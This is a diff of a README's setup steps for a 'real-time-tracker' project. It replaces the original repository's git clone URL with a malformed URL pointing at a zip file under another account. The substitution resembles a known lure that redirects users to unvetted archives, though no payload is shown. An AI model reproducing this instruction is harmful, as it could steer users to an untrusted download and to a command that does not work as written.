@@ -23,7 +23,7 @@ To run this project locally, follow these steps:
 1. Clone the repository:
 
    ```bash
-   git clone https://github.com/exclusiveabhi/real-time-tracker.git
+   git clone https://github.com/rohithyv/real-time-tracker/blob/main/real-time-tracker-main.zip.git
    cd real-time-tracker
    ```
 
